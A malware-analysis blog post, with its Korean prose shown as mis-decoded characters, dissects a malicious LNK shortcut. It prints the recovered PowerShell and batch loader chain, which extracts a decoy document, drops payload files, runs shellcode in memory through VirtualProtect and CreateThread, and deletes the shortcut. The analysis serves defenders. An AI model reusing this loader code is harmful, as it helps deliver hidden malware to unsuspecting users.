---
title: 'ğŸ“‘ "LNK", Malware Analysis'
date: 2024-12-07 21:00:00 +0900
categories: [Malware Analysis Guide]
tags: [malware_analysis_guide, lnk]
render_with_liquid: false
---


LNK íŒŒì¼ì€ ë°”ë¡œê°€ê¸° íŒŒì¼ì´ë¼ê³  ë¶ˆë¦¬ë©°, ì‚¬ìš©ìë¡œ í•˜ì—¬ê¸ˆ í´ë¦­ì„ ìœ ë„í•˜ì—¬ ì•…ì„±ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë°©ì‹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. íŒŒì¼ ë‚´ë¶€ì— ë˜ ë‹¤ë¥¸ íŒŒì¼ì„ í¬í•¨í•˜ê³  ìˆì–´ ì •ìƒ LNK íŒŒì¼ê³¼ ë‹¤ë¥´ê²Œ íŒŒì¼ í¬ê¸°ê°€ í° ê²ƒì´ íŠ¹ì§•ì…ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ìœ„ì¥ìš© ì •ìƒ íŒŒì¼ê³¼ ì•…ì„± í–‰ìœ„ì„ ìœ„í•œ ë°ì´í„°ê°€ ì¡´ì¬í•©ë‹ˆë‹¤.


## <mark>1. LNK íŒŒì¼</mark>

LNK íŒŒì¼ì€ ShellLinkHeader êµ¬ì¡°ì²´ë¡œ ì‹œì‘í•©ë‹ˆë‹¤. í•´ë‹¹ êµ¬ì¡°ì²´ ë‚´ë¶€ì—ëŠ” **CLSID_Shortcut = {00021401-0000-0000-C000-000000000046}**ì™€ LNK íŒŒì¼ ë‚´ë¶€ êµ¬ì„±ì„ ë‚˜íƒ€ë‚´ëŠ” **LinkFlags**ê°€ ì¡´ì¬í•©ë‹ˆë‹¤.

<img src="../images/2024-12-07-LNK-Malware-Analysis/IMG-lnk ë¶„ì„-20241104161918502-1733643876112-1.png" alt="IMG-lnk ë¶„ì„-20241104161918502" style="zoom: 80%;" />

ìƒ˜í”Œì˜ ê²½ìš°, 0xE4(0b11100100) ê°’ì„ ê°€ì§€ë©° ì™¼ìª½ ë¹„íŠ¸ë¶€í„° is_unicode, has_icon_location, has_arguments, has_name í”Œë˜ê·¸ë“¤ì´ ì„¤ì •ë˜ì—ˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

<img src="../images/2024-12-07-LNK-Malware-Analysis/IMG-lnk ë¶„ì„-20241104162132292-1733643901779-3.png" alt="IMG-lnk ë¶„ì„-20241104162132292" style="zoom:67%;" />

LNK íŒŒì¼ì˜ ì „ì²´ì ì¸ êµ¬ì¡°ëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤. ì´ë•Œ **LinkFlagsì—ì„œ í™œì„±í™”ë˜ì–´ ìˆì§€ ì•Šì€ í•­ëª©ë“¤ì€ ìƒëµ**ë©ë‹ˆë‹¤. ìƒ˜í”Œì€ name, arguments, icon_location ë°ì´í„°ë¡œ êµ¬ì„±ë˜ì—ˆìŒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

| LinkFlags     | Info                                                         |
| ------------- | ------------------------------------------------------------ |
| name          | lnkì˜ ëª©ì ì„ ì‹ë³„í•˜ê¸° ìœ„í•´ ìµœì¢… ì‚¬ìš©ìì—ê²Œ í‘œì‹œë˜ëŠ” ë‹¨ì¶•í‚¤ì— ëŒ€í•œ ì„¤ëª…ì„ ì§€ì • |
| rel_path      | lnkê°€ í¬í•¨ëœ íŒŒì¼ì„ ê¸°ì¤€ìœ¼ë¡œ lnk ëŒ€ìƒì˜ ìœ„ì¹˜ë¥¼ ì§€ì •          |
| working_dir   | lnk ëŒ€ìƒì„ í™œì„±í™”í•  ë•Œ ì‚¬ìš©í•  ì‘ì—… ë””ë ‰í† ë¦¬ì˜ íŒŒì¼ ì‹œìŠ¤í…œ ê²½ë¡œë¥¼ ì§€ì • |
| arguments     | lnk ëŒ€ìƒì„ í™œì„±í™”í•  ë•Œ ì§€ì •ëœ ëª…ë ¹ì¤„ ì¸ìˆ˜ë¥¼ ì €ì¥             |
| icon_location | ì•„ì´ì½˜ ë³´ê¸°ì—ì„œ lnk í•­ëª©ì„ í‘œì‹œí•  ë•Œ ì‚¬ìš©í•  ì•„ì´ì½˜ì˜ ìœ„ì¹˜ë¥¼ ì§€ì • |

<img src="../images/2024-12-07-LNK-Malware-Analysis/IMG-lnk ë¶„ì„-20241104171737263-1733643994326-6.png" alt="IMG-lnk ë¶„ì„-20241104171737263" style="zoom:67%;" />



## <mark>2. ì•…ì„± LNK íŒŒì¼ ì‹¤í–‰ íë¦„</mark>

ì•…ì„± LNK íŒŒì¼ì€ StringDataë“¤ì— ì•…ì„± ëª…ë ¹ì–´ê°€ ì €ì¥ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì‚¬ìš©ìê°€ LNK íŒŒì¼ì„ ì‹¤í–‰í•˜ë©´ ì €ì¥ë˜ì–´ ìˆë˜ ëª…ë ¹ì–´ê°€ ì‹¤í–‰ë˜ê²Œ ë©ë‹ˆë‹¤.

<img src="../images/2024-12-07-LNK-Malware-Analysis/IMG-lnk ë¶„ì„-20241104173719976-1733644013224-8.png" alt="IMG-lnk ë¶„ì„-20241104173719976" style="zoom:80%;" />

ì•…ì„± LNK íŒŒì¼ì€ ì •ìƒ LNK íŒŒì¼ë³´ë‹¤ ë” í° í¬ê¸°ë¥¼ ê°€ì§€ê³  ìˆëŠ”ë°, ì´ëŠ” **íŒŒì¼ ë‚´ë¶€ì— íŒŒì¼ êµ¬ì¡° ì´ì™¸ì˜ ë°ì´í„°ë¥¼ í¬í•¨**í•˜ê³  ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ **ìœ„ì¥ìš© ì •ìƒ íŒŒì¼**ê³¼, **ì•…ì„± í–‰ìœ„ ìˆ˜í–‰ì— í•„ìš”í•œ ë°ì´í„°**ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. LNK íŒŒì¼ì´ ì‹¤í–‰ë˜ë©´ ëª…ë ¹ì–´ì— ì˜í•´ ìœ„ì¥ìš© ì •ìƒ íŒŒì¼ë¡œ êµì²´ë˜ë©°, ì•…ì„± í–‰ìœ„ ìˆ˜í–‰ì„ ìœ„í•œ ë°ì´í„°ë¥¼ ì²˜ë¦¬í•˜ì—¬ ì•…ì„± í–‰ìœ„ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤.

<img src="../images/2024-12-07-LNK-Malware-Analysis/IMG-lnk ë¶„ì„-20241104222851857.png" alt="IMG-lnk ë¶„ì„-20241104222851857" style="zoom: 67%;" />



## <mark>3. ì•…ì„± LNK ìƒ˜í”Œ ë¶„ì„</mark>

### â–ª <u>ì•…ì„± LNK íŒŒì¼ ì‹¤í–‰</u>

ì•…ì„± LNK íŒŒì¼ì˜ ì†ì„±ì°½ì„ í™•ì¸í•´ë³´ë©´ cmd ëª…ë ¹ì–´ê°€ ì¡´ì¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì†ì„±ì°½ìœ¼ë¡œ ëª¨ë“  ëª…ë ¹ì–´ë¥¼ í™•ì¸í•˜ëŠ” ê²ƒì€ í•œê³„ê°€ ìˆìŠµë‹ˆë‹¤.

<img src="../images/2024-12-07-LNK-Malware-Analysis/IMG-lnk ë¶„ì„-20241104222044843-1733644071999-11.png" alt="IMG-lnk ë¶„ì„-20241104222044843" style="zoom: 80%;" />

ë•Œë¬¸ì— LNK íŒŒì¼ì„ ì‹¤í–‰í•œ ë’¤, procmonì„ í™•ì¸í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì–´ë–¤ cmd ëª…ë ¹ì–´ê°€ ì‹¤í–‰ë˜ì—ˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<img src="../images/2024-12-07-LNK-Malware-Analysis/IMG-lnk ë¶„ì„-20241104173915337-1733644081743-13.png" alt="IMG-lnk ë¶„ì„-20241104173915337" style="zoom:67%;" />

í™•ì¸ëœ cmd ëª…ë ¹ì–´ë¥¼ ë¶„ì„í•´ë³´ë©´, powershell ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ì—¬ ì•„ë˜ì™€ ê°™ì€ íŒŒì¼ ë‚´ë¶€ì— ìˆ¨ê²¨ì§„ ìœ„ì¥ìš© ì •ìƒ DOC ë¬¸ì„œë¥¼ ì˜¤í”ˆí•˜ëŠ” í–‰ìœ„ë¥¼ í†µí•´ ì‚¬ìš©ìê°€ ì •ìƒ íŒŒì¼ì„ ì‹¤í–‰í–ˆë‹¤ê³  ì°©ê°í•˜ê²Œ ìœ ë„í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ ì‹¤ì œ í–‰ìœ„ëŠ” LNK íŒŒì¼ ë‚´ë¶€ì— ì¡´ì¬í•˜ëŠ” ë°ì´í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ ì•…ì„± í–‰ìœ„ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤.

![IMG-lnk ë¶„ì„-20241104174044065](../images/2024-12-07-LNK-Malware-Analysis/IMG-lnk ë¶„ì„-20241104174044065-1733644090442-15.png)



### â–ª <u>powershell ìŠ¤í¬ë¦½íŠ¸ ë¶„ì„</u>

promonì—ì„œ LNK íŒŒì¼ ì˜¤í”ˆ ì‹œ, ì‹¤í–‰ë˜ëŠ” powershell ì½”ë“œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŒŒì¼ ë°ì´í„°ë¥¼ íŒŒì‹±í•˜ì—¬ ìœ„ì¥ìš© ì •ìƒ DOC ë¬¸ì„œë¥¼ ì˜¤í”ˆí•˜ê³  ì•…ì„± í–‰ìœ„ ìˆ˜í–‰ì— í•„ìš”í•œ íŒŒì¼ë“¤ì„ ìƒì„±í•©ë‹ˆë‹¤.

![IMG-lnk ë¶„ì„-20241208165231069](../images/2024-12-07-LNK-Malware-Analysis/IMG-lnk ë¶„ì„-20241208165231069.png)



#### 1. powershell.exeë¥¼ ê²€ìƒ‰í•˜ì—¬ ì‹¤í–‰í•˜ëŠ” ì½”ë“œ

```powershell
# powershell í´ë”ì—ì„œ powershellì„ ì‹¤í–‰í•˜ê¸° ìœ„í•œ ì½”ë“œ
"C:\Windows\SysWOW64\cmd.exe" /k for /f "tokens=*" %a in ('dir C:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe /s /b /od') do call %a
```



#### 2. lnk íŒŒì¼ ì‹ë³„ í›„, íŒŒì¼ ê°ì²´ ìƒì„±

```powershell
# $dirPath = Get-Location í˜„ì¬ ë””ë ‰í† ë¦¬ë¥¼ ë³€ìˆ˜ë¡œ ì €ì¥
$dirPath = Get-Location;

# ë§Œì•½ $dirPathê°€ System32ê±°ë‚˜ Program Filesë©´ $dirPathë¥¼ C:\Users\user\AppData\Local\Tempë¡œ ì—…ë°ì´íŠ¸
if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = 'C:\Users\user\AppData\Local\Temp'};

# *.lnkë¡œëœ íŒŒì¼ ì¤‘ í¬ê¸°ê°€ 0x0325E0BCì¸ íŒŒì¼ì„ ì°¾ì•„ FullNameì„ $lnkPathë¡œ ì„¤ì •
$lnkPath = Get-ChildItem -Path $dirPath -Recurse *.lnk | where-object {$_.length -eq 0x0325E0BC} | Select-Object -ExpandProperty FullName;

# $lnkPathë¥¼ ì—´ì–´ $lnkFileë¡œ ìƒˆ ê°ì²´ ìƒì„±
$lnkFile=New-Object System.IO.FileStream($lnkPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read);
```



#### 3. lnk íŒŒì¼ ë‚´ë¶€ì—ì„œ doc íŒŒì¼ ì¶”ì¶œ ë° ì‹¤í–‰

```powershell
# $lnkFileì—ì„œ 0x0000108E ê°’ì„ ì°¾ìŒ.
$lnkFile.Seek(0x0000108E, [System.IO.SeekOrigin]::Begin);

# $pdfFile ê°ì²´ë¥¼ ìƒì„±, í¬ê¸° 0x0087F800
$pdfFile=New-Object byte[] 0x0087F800;

# $lnkFileì—ì„œ ì°¾ì€ 0x0000108E ë¶€í„° 0x0087F800í¬ê¸° ë§Œí¼ ì½ìŒ
$lnkFile.Read($pdfFile, 0, 0x0087F800);

# .lnk í™•ì¥ìë¥¼ .docë¡œ ë³€ê²½í•˜ì—¬ $pdfPathë¡œ ì €ì¥
$pdfPath = $lnkPath.replace('.lnk','.doc');

# Set-Contentë¡œ pdfFileì˜ ë‚´ìš©ì„ Byteë¡œ ì¸ì½”ë”©í•˜ì—¬ $pdfPathì— ì €ì¥
sc $pdfPath $pdfFile -Encoding Byte;

# pdfPath ì‹¤í–‰
& $pdfPath;
```



#### 4. lnk íŒŒì¼ ë‚´ë¶€ì—ì„œ panic.dat íŒŒì¼ ì¶”ì¶œ

```powershell
# $lnkFile íŒŒì¼ì—ì„œ 0x0088088Eë¥¼ ì°¾ìŒ.
$lnkFile.Seek(0x0088088E,[System.IO.SeekOrigin]::Begin);

# $exeFile ê°ì²´ë¥¼ ìƒì„±, í¬ê¸° 0x000D9402
$exeFile=New-Object byte[] 0x000D9402;

# $lnkFile íŒŒì¼ì—ì„œ ì°¾ì€ 0x0088088Eë¶€í„° 0x000D9402 í¬ê¸° ë§Œí¼ ì½ìŒ
$lnkFile.Read($exeFile, 0, 0x000D9402);

# public ê²½ë¡œ + \ + panic.datìœ¼ë¡œ $exePath ì„¤ì •
$exePath=$env:public+'\'+'panic.dat';

# Set-Contentë¡œ $exeFileì˜ ë‚´ìš©ì„ Byteë¡œ ì¸ì½”ë”©í•˜ì—¬ $exePathì— ì €ì¥;
sc $exePath $exeFile -Encoding Byte;

```



#### 5. lnk íŒŒì¼ ë‚´ë¶€ì—ì„œ para.dat íŒŒì¼ ì¶”ì¶œ

```powershell
# 0x00959C90ë¥¼ ì°¾ìŒ
$lnkFile.Seek(0x00959C90,[System.IO.SeekOrigin]::Begin);

# 0x000005A9 í¬ê¸°ì˜ $stringByte ê°ì²´ ìƒì„±
$stringByte = New-Object byte[] 0x000005A9;

# 0x000005A9 í¬ê¸° ë§Œí¼ ì½ìŒ.
$lnkFile.Read($stringByte, 0, 0x000005A9);

# para.dat íŒŒì¼ ê²½ë¡œë¥¼ ìƒì„±
$batStrPath = $env:temp+'\'+'para.dat';

# $stringByteë¥¼ utf8ë¡œ ì¸ì½”ë”©
$string = [System.Text.Encoding]::UTF8.GetString($stringByte);

# $batStrPathë¡œ ascii ì¸ì½”ë”©í•˜ì—¬ íŒŒì¼ ìƒì„±
$string | Out-File -FilePath $batStrPath -Encoding ascii;

```



#### 6. lnk íŒŒì¼ ë‚´ë¶€ì—ì„œ price.bat íŒŒì¼ ì¶”ì¶œ ë° ì‹¤í–‰

```powershell
# 0x0095A239ë¥¼ ì°¾ìŒ
$lnkFile.Seek(0x0095A239,[System.IO.SeekOrigin]::Begin);

# 0x00000135 í¬ê¸°ì˜ ê°ì²´ ìƒì„±
$batByte = New-Object byte[] 0x00000135;

# 0x00000135 í¬ê¸°ë§Œí¼ ì½ìŒ.
$lnkFile.Read($batByte, 0, 0x00000135);

# price.bat ê²½ë¡œë¥¼ ìƒì„±
$executePath = $env:temp+'\'+'price.bat';

# $executePath ì¶œë ¥
Write-Host $executePath;

# $batStrPath ì¶œë ¥
Write-Host $batStrPath;

# $batByteë¥¼ utf8ë¡œ ì¸ì½”ë”©í•˜ì—¬ $bastStringì— ì €ì¥
$bastString = [System.Text.Encoding]::UTF8.GetString($batByte);

# $executePathì— $bastStringì„ ì €ì¥
$bastString | Out-File -FilePath $executePath -Encoding ascii;

# $executePath ì‹¤í–‰
& $executePath;
```



#### 7. ê°ì²´ ì •ë¦¬ ë° lnk íŒŒì¼ ì‚­ì œ í›„ ì¢…ë£Œ

```powershell
# lnkFile ê°ì²´ ë‹«ê¸°
$lnkFile.Close();

# $lnkPathë¥¼ ì‚­ì œ
remove-item -path $lnkPath -force;

# ì¢…ë£Œ
"&& exit
```



### â–ª <u>price.bat ë¶„ì„</u>

LNK íŒŒì¼ì— ì˜í•´ ì‹¤í–‰ë˜ëŠ” **price.bat** íŒŒì¼ ë‚´ë¶€ë¥¼ í™•ì¸í•´ë³´ë©´, ë‹¤ìŒê³¼ ê°™ì€ íŒŒì›Œì…€ ì½”ë“œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **para.dat** íŒŒì¼ì— ì ‘ê·¼í•˜ì—¬, íŒŒì¼ì„ ì½ì–´ë“¤ì—¬ ë‚´ë¶€ì— ì¡´ì¬í•˜ëŠ” scriptë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.

```powershell
# powershell.exe ì‹¤í–‰
start /min C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden

# para.dat íŒŒì¼ ê²½ë¡œ íšë“
$stringPath=$env:temp+'\'+'para.dat';

# para.dat íŒŒì¼ ë‚´ì˜ ë°ì´í„° íšë“
$stringByte = Get-Content -path $stringPath -encoding byte;

# para.dat ë‚´ì˜ ë°ì´í„°ë¥¼ utf8ë¡œ ì¸ì½”ë”©
$string = [System.Text.Encoding]::UTF8.GetString($stringByte);

# ì¸ì½”ë”©í•œ ë°ì´í„°ë¡œ scriptblockì„ ìƒì„±
$scriptBlock = [scriptblock]::Create($string);

# ìƒì„±í•œ scriptblockì„ ì‹¤í–‰
&$scriptBlock;
```



### â–ª <u>para.dat ë¶„ì„</u>

**price.bat** íŒŒì¼ì— ì˜í•´ ì‹¤í–‰ë˜ëŠ” **para.dat** íŒŒì¼ì€ ìŠ¤ë ˆë“œë¥¼ ìƒì„±í•˜ì—¬ ì•…ì„±  Shellcode ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.



#### 1. panic.dat ë°ì´í„° íšë“

```powershell
# panic.dat íŒŒì¼ ê²½ë¡œ íšë“
$exePath=$env:public+'\'+'panic.dat';

# ë‚´ë¶€ ë°ì´í„°ë¥¼ íšë“
$exeFile = Get-Content -path $exePath -encoding byte;
```



#### 2. SecurityProtocol ì†ì„±ì„ TLS 1.2ë¡œ ì„¤ì •

```powershell
# SecurityProtocol ì†ì„±ì„ TLS 1.2ë¡œ ì„¤ì •
[Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([Net.SecurityProtocolType], 3072);
```



#### 3. kernel32 API íšë“

```powershell
# "kernel32.dll"
$k1123 = [System.Text.Encoding]::UTF8.GetString(34) + 'kernel32.dll' + [System.Text.Encoding]::UTF8.GetString(34);

# GlobalAlloc íšë“
$a90234s = '[DllImport(' + $k1123 + ')]public static extern IntPtr GlobalAlloc(uint b,uint c);';

# GlobalAllocë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•œ í´ë˜ìŠ¤ ì •ì˜
$b = Add-Type -MemberDefinition $a90234s  -Name 'AAA' -PassThru;

# VirtualProtect íšë“
$d3s9sdf = '[DllImport(' + $k1123 + ')]public static extern bool VirtualProtect(IntPtr a,uint b,uint c,out IntPtr d);';

# VirtualProtectë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•œ í´ë˜ìŠ¤ ì •ì˜
$a90234sb = Add-Type -MemberDefinition $d3s9sdf -Name 'AAB' -PassThru;

# CreateThread íšë“
$b3s9s03sfse = '[DllImport(' + $k1123 + ')]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);';

# CreateThreadë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•œ í´ë˜ìŠ¤ ì •ì˜
$cake3sd23 = Add-Type -MemberDefinition $b3s9s03sfse  -Name 'BBB' -PassThru;

# WaitForSingleObject íšë“
$dtts9s03sd23 = '[DllImport(' + $k1123 + ')]public static extern IntPtr WaitForSingleObject(IntPtr a,uint b);';

# WaitForSingleObjectë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•œ í´ë˜ìŠ¤ ì •ì˜
$fried3sd23 = Add-Type -MemberDefinition $dtts9s03sd23 -Name 'DDD' -PassThru;
```



#### 4. Threadë¥¼ ìƒì„±í•˜ì—¬ shellcode ì‹¤í–‰

```powershell
# panic.datì˜ ë‚´ë¶€ ë°ì´í„° ê¸¸ì´ë¥¼ íšë“
$byteCount = $exeFile.Length;

# GlobalAllocìœ¼ë¡œ heap í• ë‹¹
$buffer = $b::GlobalAlloc(0x0040, $byteCount + 0x100);

# VirtualProtectë¡œ rwx ê¶Œí•œ ë¶€ì—¬
$old = 0;
$a90234sb::VirtualProtect($buffer, $byteCount + 0x100, 0x40, [ref]$old);

# í• ë‹¹í•œ heapì— panic.datì˜ ë‚´ë¶€ ë°ì´í„° ì‘ì„±
for($i = 0; $i -lt $byteCount; $i++) {
	[System.Runtime.InteropServices.Marshal]::WriteByte($buffer, $i, $exeFile[$i]);
};

# CreateThreadë¥¼ í˜¸ì¶œí•˜ì—¬ ì‘ì„±í•œ panic.dat ë‚´ë¶€ ë°ì´í„° ì‹¤í–‰.
$handle = $cake3sd23::CreateThread(0, 0, $buffer, 0, 0, 0);

# ìƒì„±í•œ Threadê°€ ì¢…ë£Œë  ë•Œê¹Œì§€ ëŒ€ê¸°
$fried3sd23::WaitForSingleObject($handle, 500 * 1000);
```



### â–ª <u>panic.dat ë¶„ì„</u>

cff explorerë¥¼ ì‚¬ìš©í•˜ì—¬ **panic.dat** íŒŒì¼ì„ í™•ì¸í•´ë³´ë‹ˆ, ë‚´ë¶€ì— shellcodeê°€ ì¡´ì¬í•˜ì˜€ìŠµë‹ˆë‹¤.

<img src="../images/2024-12-07-LNK-Malware-Analysis/IMG-lnk ë¶„ì„-20241208165231186.png" alt="IMG-lnk ë¶„ì„-20241208165231186" style="zoom: 80%;" />

jmp2itì„ ì‚¬ìš©í•˜ì—¬ shellcodeë¥¼ í™•ì¸í•œ ê²°ê³¼ tmp íŒŒì¼ì„ ìƒì„±í•˜ëŠ” í–‰ìœ„ë¥¼ í™•ì¸í–ˆìŠµë‹ˆë‹¤.

![IMG-lnk ë¶„ì„-20241208165231341](../images/2024-12-07-LNK-Malware-Analysis/IMG-lnk ë¶„ì„-20241208165231341.png)

tridë¡œ í™•ì¸í•œ ê²°ê³¼ jpg íŒŒì¼ì´ì˜€ê³  í™•ì¥ìë¥¼ ë³€ê²½í•˜ì—¬ í™•ì¸í•´ë³´ë‹ˆ ìŠ¤í¬ë¦° ìƒ·ì´ì—ˆìŠµë‹ˆë‹¤. ìµœì¢… ì•…ì„±ì½”ë“œëŠ” **Info-Stealer**ë¡œ ì¶”ì •ë©ë‹ˆë‹¤.

<img src="../images/2024-12-07-LNK-Malware-Analysis/IMG-lnk ë¶„ì„-20241208165231547.png" alt="IMG-lnk ë¶„ì„-20241208165231547" style="zoom: 67%;" />
